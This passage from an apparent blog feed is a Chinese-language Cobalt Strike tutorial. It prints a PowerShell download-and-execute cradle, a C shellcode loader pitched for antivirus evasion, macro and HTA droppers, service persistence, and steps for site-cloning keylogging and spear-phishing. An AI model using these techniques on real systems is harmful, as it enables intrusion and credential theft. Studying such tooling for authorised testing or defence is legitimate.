    <summary type="html">&lt;h1 id=&quot;1-创建目录&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-创建目录&quot;&gt;#&lt;/a&gt; 1、创建目录&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;目录结构如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://wuriteup.oss-cn-q</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike</title>
    <link href="http://example.com/post/CobaltStrike.html"/>
    <id>http://example.com/post/CobaltStrike.html</id>
    <published>2022-10-06T14:02:27.000Z</published>
    <updated>2022-10-06T14:03:06.563Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-cobalt-strike介绍"><a class="markdownIt-Anchor" href="#1-cobalt-strike介绍">#</a> 1、Cobalt Strike 介绍</h1><h2 id="11-介绍"><a class="markdownIt-Anchor" href="#11-介绍">#</a> 1.1 介绍</h2><ul><li>Cobalt Strike 是一款基于 java 的渗透测试神器，常被业界人称为 CS 神器。自 3.0 以后已经不在使用 Metasploit 框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和 sessions，可模拟 APT 做模拟对抗，进行内网渗透。</li><li>Cobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等。</li></ul><h2 id="12-目录结构"><a class="markdownIt-Anchor" href="#12-目录结构">#</a> 1.2 目录结构</h2><pre class="line-numbers language-none"><code class="language-none">│ agscript 拓展应用的脚本│ c2lint 检查profile的错误异常│ cobaltstrike│ cobaltstrike.jar 客户端程序│ icon.jpg│ license.pdf│ readme.txt│ releasenotes.txt│ teamserver 服务端程序│ update│ update.jar│└─third-party 第三方工具    README.vncdll.txt    vncdll.x64.dll    vncdll.x86.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13-个人定制"><a class="markdownIt-Anchor" href="#13-个人定制">#</a> 1.3 个人定制</h2><ul><li>Cobalt Strike 可以使用 AggressorScripts 脚本来加强自身，能够扩展菜单栏，Beacon 命令行，提权脚本等</li><li>Cobalt Strike 通信配置文件是 Malleable C2 你可以修改 CS 的通讯特征，Beacon payload 的一些行为</li><li>Cobalt Strike 可以引用其他的通讯框架 ExternalC2，ExternalC2 是由 Cobalt Strike 提出的一套规范 / 框架，它允许黑客根据需要对框架提供的默认 HTTP (S)/DNS/SMB C2 通信通道进行扩展</li></ul><h2 id="14-启动运行"><a class="markdownIt-Anchor" href="#14-启动运行">#</a> 1.4 启动运行</h2><ul><li>cobalt strike 的团队服务器最好运行在 linux 平台上，服务端的关键文件是 teamserver 和 cobaltstrike.jar，解压时要将这两个文件放到同一目录下</li><li>可以通过编辑 <code>./teamserver</code>  文件对启动的端口进行修改</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923203719117.png" alt="image-20220923203719117"></p><ul><li><mark>服务端</mark>启动命令 (若无法运行在 Linux 中执行 <code>chmod o+x teamserver</code> )</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./teamserver <span class="token operator">&lt;</span>HOST<span class="token operator">></span> <span class="token operator">&lt;</span>PASSWORD<span class="token operator">></span> <span class="token punctuation">[</span>/path/to/c2.profile<span class="token punctuation">]</span> <span class="token punctuation">[</span>YYYY-MM-DD<span class="token punctuation">]</span><span class="token comment">#例如：</span><span class="token function">sudo</span> ./teamserver <span class="token number">10.10</span>.10.132 <span class="token number">123456</span> <span class="token comment">#一定使用强密码，放在公网会被爆破</span><span class="token comment"># 参数说明</span><span class="token operator">&lt;</span>host<span class="token operator">></span> 必需参数 团队服务器IP<span class="token operator">&lt;</span>password<span class="token operator">></span> 必需参数 连接服务器的密码<span class="token punctuation">[</span>/path/to/c2.profile<span class="token punctuation">]</span> 可选参数 指定C2通信配置文件，体现其强大的扩展性<span class="token punctuation">[</span>YYYY-MM-DD<span class="token punctuation">]</span> 可选参数 所有payload的终止时间<span class="token comment">#放置到后台运行</span><span class="token function">sudo</span> <span class="token function">nohup</span> ./teamserver <span class="token number">10.10</span>.10.132 <span class="token number">123456</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><mark>客户端</mark>启动 —— 注意第一次连接会有指纹提示</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#windows端直接双击start.bat</span><span class="token comment">#linux：</span><span class="token function">sudo</span> ./cobaltstrike <span class="token comment">#如果无执行权限使用chmod o+x cobaltstrike</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923204413073.png" alt="image-20220923204413073"></p><h2 id="15-偏好设置"><a class="markdownIt-Anchor" href="#15-偏好设置">#</a> 1.5 偏好设置</h2><ul><li>客户端每次连接都会自动保存配置文件，可以在偏好设置删除没用的连接信息</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923204552017.png" alt="image-20220923204552017"></p><h2 id="16-参数说明"><a class="markdownIt-Anchor" href="#16-参数说明">#</a> 1.6 参数说明</h2><p><strong>Cobalt Strike</strong></p><pre class="line-numbers language-none"><code class="language-none">New Connection # 新建连接，支持连接多个服务器端Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录Visualization # 主要展示输出结果的视图VPN Interfaces # 设置VPN接口Listenrs # 创建监听器Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等Close # 退出连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>View</strong></p><pre class="line-numbers language-none"><code class="language-none">New Connection # 新建连接，支持连接多个服务器端Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录Visualization # 主要展示输出结果的视图VPN Interfaces # 设置VPN接口Listenrs # 创建监听器Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等Close # 退出连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>Attacks</strong></em></p><p><strong>Packages</strong></p><pre class="line-numbers language-none"><code class="language-none">HTML Application # 生成(executable&#x2F;VBA&#x2F;powershell)这三种原理实现的恶意HTA木马文件MS Office Macro # 生成office宏病毒文件Payload Generator # 生成各种语言版本的payloadUSB&#x2F;CD AutoPlay # 生成利用自动播放运行的木马文件Windows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)Windows Executable # 生成可执行exe木马Windows Executable(Stageless) # 生成无状态的可执行exe木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Web Drive-by</strong></p><pre class="line-numbers language-none"><code class="language-none">Manage # 对开启的web服务进行管理Clone Site # 克隆网站，可以记录受害者提交的数据Host File # 提供文件下载，可以选择Mime类型Scripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_deliverySigned Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)Smart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java1.7.0_21以下版本(该方法已过时)System Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等Spear Phish # 鱼叉钓鱼邮件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Reporting</strong></p><pre class="line-numbers language-none"><code class="language-none">Activity Report # 活动报告Hosts Report # 主机报告Indicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5hashesSessions Report # 会话报告Social Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录Tactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略Reset Data # 重置数据Export Data # 导出数据，导出.tsv文件格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Help</strong></p><pre class="line-numbers language-none"><code class="language-none">Homepage # 官方主页Support # 技术支持Arsenal # 开发者System information # 版本信息About # 关于<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>工具栏</strong></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923204900401.png" alt="image-20220923204900401"></p><pre class="line-numbers language-none"><code class="language-none">1.新建连接2.断开当前连接3.监听器4.改变视图为Pivot Graph(视图列表)5.改变视图为Session Table(会话列表)6.改变视图为Target Table(目标列表)7.显示所有以获取的受害主机的凭证8.查看已下载文件9.查看键盘记录结果10.查看屏幕截图11.生成无状态的可执行exe木马12.使用java自签名的程序进行钓鱼攻击13.生成office宏病毒文件14.为payload提供web服务以便下载和执行15.提供文件下载，可以选择Mime类型16.管理Cobalt Strike上运行的web服务17.帮助18.关于<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-基础使用上线"><a class="markdownIt-Anchor" href="#2-基础使用上线">#</a> 2、基础使用上线</h1><ul><li>执行 ```sudo ./cobaltstrike`` 打开客户端，输入账号密码后登录</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923205012422.png" alt="image-20220923205012422"></p><ul><li>可在视图中打开事件日志</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923205116996.png" alt="image-20220923205116996"></p><ul><li>首先配置监听器，监听器可在上方菜单栏 cobaltstrike 中打开</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923205602782.png" alt="image-20220923205602782"></p><pre class="line-numbers language-：" data-language="："><code class="language-：">#监听参数说明名字：随意，用于区分就好，可设置多个监听器payload：    Beacon DNS    Beacon HTTP    Beacon HTTPS    Beacon SMB    Beacon TCP    External C2    Foreign HTTP    Foreign HTTPS地址轮询策略：round-robin：按主机名的顺序循环浏览主机名列表random：每次访问时，从列表中随机选择一个主机名尝试连接。failover-xx：使用每台主机一段时间。指定的持续时间（m、h、d），然后使用下一个主机。HTTP地址：可以写IP也可以写域名，但是要求IP和域名都是对应的服务端的地址配置名称：defaultHTTP端口(上线)：监听器监听的上线端口，可自定义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="21-http地址为域名"><a class="markdownIt-Anchor" href="#21-http地址为域名">#</a> 2.1 HTTP 地址为域名</h2><ul><li>在域内使用域控主机添加了几条域名，IP 指向服务器地址</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210054718.png" alt="image-20220923210054718"></p><ul><li>添加三个域名记录</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210537735.png" alt="image-20220923210537735"></p><ul><li>生成后门并连接</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210555748.png" alt="image-20220923210555748"></p><h2 id="22-基础的windowsexe生成"><a class="markdownIt-Anchor" href="#22-基础的windowsexe生成">#</a> 2.2 基础的 windows.exe 生成</h2><ul><li>点击攻击 -&gt; 生成后门 -&gt;windows 可执行程序，选择对应的监听器进行保存即可，可选用是否适用 64 位</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210716989.png" alt="image-20220923210716989"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210739987.png" alt="image-20220923210739987"></p><ul><li>将生成的文件上传到被攻击主机上执行即可</li></ul><h1 id="3-dns上线"><a class="markdownIt-Anchor" href="#3-dns上线">#</a> 3、dns 上线</h1><ul><li>如果在内网中防火墙只允许 dns 出网，在 cs 中有 dns 模块，可以使用 dns 使主机上线，<strong>需要使用公网服务器和域名</strong></li><li>查询 dns 是否出网命令：<mark> <code>nslookup www.baidu,com</code> </mark>，返回结果如下说明可以出网</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211047340.png" alt="image-20220923211047340"></p><ul><li>设置一条 A 记录指向公网 IP，设置两条 ns 记录指向 A 记录</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211219310.png" alt="image-20220923211219310"></p><ul><li>建立 dns 监听</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211238138.png" alt="image-20220923211238138"></p><ul><li><strong>注意</strong>：因为 dns 的默认端口是 53 端口，在 ubuntu 的 53 端口默认是开启的，如果出现占用情况，先把 53 端口关闭</li><li><a href="https://blog.csdn.net/qq_24924187/article/details/109197505">(87 条消息) Linux systemd-resolve 占用 53 端口的解决方法_神尾观铃酱的博客 - CSDN 博客_systemd-resolved 占用 53 号端口</a></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop systemd-resolved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用攻击 -&gt;web 钓鱼 -&gt; 文件投递生成 payload，将 payload 在目标主机 powershell 中执行</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211447748.png" alt="image-20220923211447748"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211534500.png" alt="image-20220923211534500"></p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.10.132:80&#x2F;adfdf&#39;))&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>上线后是一个黑色图标，使用命令 <code>checkin</code>  强制目标回连并更新状态（用于 DNS 上线，DNS 模式下无新任务时目标不会回连 Teamserver）</li><li>在 beacon 支持三种 dns 执行命令方式，一般使用 dns-txt 较多</li></ul><pre class="line-numbers language-none"><code class="language-none">mode dns 使用DNS A记录作为数据通道（仅支持DNS上线Beacon）mode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）mode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211649606.png" alt="image-20220923211649606"></p><h1 id="4-生成后门模块使用"><a class="markdownIt-Anchor" href="#4-生成后门模块使用">#</a> 4、生成后门模块使用</h1><ul><li>生成后门功能中共有以下几个模块</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211911580.png" alt="image-20220923211911580"></p><h2 id="41-hta文档"><a class="markdownIt-Anchor" href="#41-hta文档">#</a> 4.1 HTA 文档</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211931875.png" alt="image-20220923211931875"></p><ul><li>method 共有三种：executeable 可执行文件；powershell 命令行；VBA 配合 office，通常使用 PowerShell 配合文件投递使用，同时 powershell 便于制作免杀</li><li>生成文件后使用文件托管进行投递文件</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212117641.png" alt="image-20220923212117641"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212152988.png" alt="image-20220923212152988"></p><ul><li>设置好后会出现 powershell 的 payload，别人访问该网站就会上线</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.10.132:80&#x2F;download&#x2F;file.hta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212231939.png" alt="image-20220923212231939"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212345237.png" alt="image-20220923212345237"></p><h2 id="42-office宏"><a class="markdownIt-Anchor" href="#42-office宏">#</a> 4.2 Office 宏</h2><ul><li>office 宏后门可将生成的 payload 放在 office 文件中，当打开这个文件并启用宏，电脑就会上线</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144241107.png" alt="image-20220924144241107"></p><ul><li>生成后根据 cs 的提示进行操作即可，另存为的时候要注意选择文件类型</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144335417.png" alt="image-20220924144335417"></p><ul><li>打开后可能会进行拦截，点击启用宏上线</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144416792.png" alt="image-20220924144416792"></p><h2 id="43-payload生成器"><a class="markdownIt-Anchor" href="#43-payload生成器">#</a> 4.3 payload 生成器</h2><ul><li>cs 提供 payload 生成器，因为默认的 shellcode 容易被杀毒软件查杀，使用 shellcode 加载器运行 payload 更容易做免杀</li><li>在 payload 生成器中可以选择各种语言的 payload</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144537899.png" alt="image-20220924144537899"></p><ul><li>下面提供一个 C 语言生成 shellcode 的代码，使用 release 编译出 exe 后放到主机中执行上线</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>linker<span class="token punctuation">,</span></span><span class="token string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span><span class="token expression"><span class="token punctuation">)</span></span><span class="token comment">//不显示窗口</span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xfc.."</span><span class="token punctuation">;</span><span class="token punctuation">;</span> #这个变量就是生成的payload<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    LPVOID Memory <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Memory <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>Memory<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Memory<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>** 注：** 编译记得使用 Release 模式而不是 Debug 生成 否则回出现错误</p><h2 id="44-windows可执行程序"><a class="markdownIt-Anchor" href="#44-windows可执行程序">#</a> 4.4 windows 可执行程序</h2><ul><li>windows 提供三种生成文件类型<ul><li>windwos 可执行程序 直接双击运行</li><li>windwos 服务程序 可以使用 sc 命令做成服务程序</li><li>windows dll 文件</li></ul></li></ul><h3 id="441-exe可执行程序"><a class="markdownIt-Anchor" href="#441-exe可执行程序">#</a> 4.4.1 exe 可执行程序</h3><ul><li>生成后门后直接在目标主机运行文件即可上线</li></ul><h3 id="442-service-exe服务程序"><a class="markdownIt-Anchor" href="#442-service-exe服务程序">#</a> 4.4.2 service exe 服务程序</h3><ul><li>在 cs 中生成服务程序</li></ul><pre class="line-numbers language-beacon" data-language="beacon"><code class="language-beacon">shell sc create &quot;server1&quot; binpath&#x3D; &quot;C:\WINDOWS\Temp\server1.exe&quot;shell sc description &quot;server1&quot; &quot;description&quot;shell sc config &quot;server1&quot; start&#x3D; autoshell net start &quot;server1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144910067.png" alt="image-20220924144910067"></p><p>执行之后是 system 权限，这也是一种留后门的方法</p><h3 id="443-windows-dll文件"><a class="markdownIt-Anchor" href="#443-windows-dll文件">#</a> 4.4.3 windows dll 文件</h3><ul><li><p>windows dll 文件：</p><ul><li><p>在 windows 的 system 文件夹下有一个 regsvr32.exe 的程序，它就是 windows 自带的 activex 注册和反注 册工具。(activex 不注册是不能够被系统识别和使用的，一般安装程序都会自动地把它所使用的 activex 控件注册)。Regsvr32 命令用于注册 COM 组件，是 Windows 系统提供的用来向系统注册控件或者卸载 控件的命令，以命令行方式运行。</p></li><li><p>regsvr32</p><pre class="line-numbers language-none"><code class="language-none">&quot;regsvr32 [&#x2F;s] [&#x2F;n] [&#x2F;i(:cmdline)] dllname”。其中dllname为activex控件文件名，建议在安装前拷贝到system文件夹下。参数有如下意义：&#x2F;u——反注册控件（卸载com组建）&#x2F;s——不管注册成功与否，均不显示提示框（静默模式，不弹框）&#x2F;c——控制台输出&#x2F;i——跳过控件的选项进行安装(传给DllInstall的参数内容，regsvr32 允许注册过程中 dll 进行一些自定义的安装过程，该过程在 DllInstall 中实现。)&#x2F;n——不注册控件，此选项必须与&#x2F;i选项一起使用Scrobj.dll:com服务器，全名Windows Script Component,DllInstall方法在这个组件中实现。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145042700.png" alt="image-20220924145042700"></p><pre class="line-numbers language-none"><code class="language-none">#执行文件c:\Windows\System32\regsvr32.exe C:\Windows\Temp\artifact.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145240689.png" alt="image-20220924145240689"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145301379.png" alt="image-20220924145301379"></p><h1 id="5-web钓鱼模块"><a class="markdownIt-Anchor" href="#5-web钓鱼模块">#</a> 5、Web 钓鱼模块</h1><pre class="line-numbers language-none"><code class="language-none">Manage 对开启的web服务进行管理；Clone Site 克隆网站，可以记录受害者提交的数据；Host File 提供一个文件下载，可以修改Mime信息；Scripted Web Delivery 类似于msf 的web_delivery ;Signed Applet Attack 使用java自签名的程序进行钓鱼攻击;Smart Applet Attack 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；System Profiler 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="51-站点管理"><a class="markdownIt-Anchor" href="#51-站点管理">#</a> 5.1 站点管理</h2><ul><li>凡是使用 web 钓鱼进行文件托管或生成的 powershell payload 等都会在 web 站点管理中有记录，可进行复制 URL、删除等操作</li><li>添加了 IP 和端口的记录可进行访问下载文件</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145638681.png" alt="image-20220924145638681"></p><h2 id="52-克隆网站"><a class="markdownIt-Anchor" href="#52-克隆网站">#</a> 5.2 克隆网站</h2><ul><li>克隆网站可以克隆一个登录页面记录受害者的<mark>键盘输入</mark>，也可以附加文件，受害者在访问该网站时会<mark>自动下载文件</mark>进行上线</li><li>如：某人博客，下图为正常网站 URL</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924150652309.png" alt="image-20220924150652309"></p><ul><li>生成克隆站点</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924150727710.png" alt="image-20220924150727710"></p><ul><li>访问后可抓取键盘输入（<mark>在视图 ----web 日志中查看</mark>）</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924150811752.png" alt="image-20220924150811752"></p><h1 id="6-邮件钓鱼"><a class="markdownIt-Anchor" href="#6-邮件钓鱼">#</a> 6、邮件钓鱼</h1><ul><li>首先需要准备一个.eml 的钓鱼模板，可在邮箱中直接导出</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151037731.png" alt="image-20220924151037731"></p><ul><li>准备好 eml 文件后，参数设置如下</li></ul><pre class="line-numbers language-none"><code class="language-none">目标：目标邮箱，使用文件一个一行以列表形式加载模板：保存的eml文件附件：打开邮件后下载的文件，可以放后门木马嵌入url：将邮件中的原有连接替换为需要的连接邮件服务器：使用的邮箱的服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151634774.png" alt="image-20220924151634774"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151701739.png" alt="image-20220924151701739"></p><ul><li>发送的钓鱼邮件如下，此时由于设置了嵌入 url 选项，点击这个链接会跳转到 baidu</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151900399.png" alt="image-20220924151900399"></p><h1 id="7-beacon的使用"><a class="markdownIt-Anchor" href="#7-beacon的使用">#</a> 7、beacon 的使用</h1><ul><li><p>Beacon 是 Cobalt Strike 为高级攻击者建模的 Payload。使用 Beacon 通过 HTTP，HTTPS 或 DNS 出口网络。而且 Beacon 非常灵活，支持异步和交互式通信。异步通信既低又慢。Beacon 将通讯本地，下载任务，然后进入睡眠状态。交互式通信实时发生。</p></li><li><p>主机上线后右键主机选择交互会话打开 beacon 命令行</p></li></ul><h2 id="71-beacon的命令"><a class="markdownIt-Anchor" href="#71-beacon的命令">#</a> 7.1 beacon 的命令</h2><ul><li>在 beacon 会话中使用 <code>help</code>  可查看帮助文档，help command 可查看具体命令帮助</li></ul><pre class="line-numbers language-none"><code class="language-none">Command Description------- -----------argue 命令行参数欺骗blockdlls 禁止子进程加载非微软签名的dllbrowserpivot 注入浏览器进程代理用户已认证身份（仅支持IE）cancel 取消正在下载的文件cd 跳转目录checkin 强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver）chromedump 提取Chrome保存的账号密码、Cookies等信息clear 清空beacon任务队列connect 通过TCP正向连接远程Beaconcovertvpn 部署Covert VPN客户端cp 复制文件dcsync 从域控提取密码hashdesktop 远程VNC控制用户桌面dllinject 注入一个内存反射加载的dll到目标进程dllload 使用LoadLibrary方式在目标进程中加载一个dlldownload 下载文件downloads 列出所有正在下载的文件drives 列出所有磁盘盘符elevate 利用提权漏洞获取一个高权限Beaconexecute 在目标上执行程序（无回显）execute-assembly 在目标上内存加载执行本地.NET程序exit 结束当前Beacon会话getprivs 在当前进程访问令牌（access token）中启用system特权getsystem 尝试获取SYSTEM用户权限getuid 获取当前进程访问令牌（access token）的用户信息hashdump 获取本地用户hashhelp 帮助信息inject 在指定进程中注入新的Beacon会话inline-execute 在当前会话中执行Beacon Object Filejobkill 结束一个后台任务jobs 列出所有后台任务jump 在远程机器上植入Beacon（横向移动）kerberos_ccache_use 从ccache文件导入kerberos票据到当前会话中kerberos_ticket_purge 清空当前会话中的所有kerberos票据kerberos_ticket_use 从ticket文件中导入kerberos票据到当前会话中keylogger 开启键盘记录kill 结束指定进程link 通过命名管道正向连接远程Beaconlogonpasswords 使用mimikatz获取密码和hashls 列出目录文件make_token 创建进程访问令牌（access token），仅用于访问网络资源mimikatz 运行mimikatzmkdir 创建目录mode dns 使用DNS 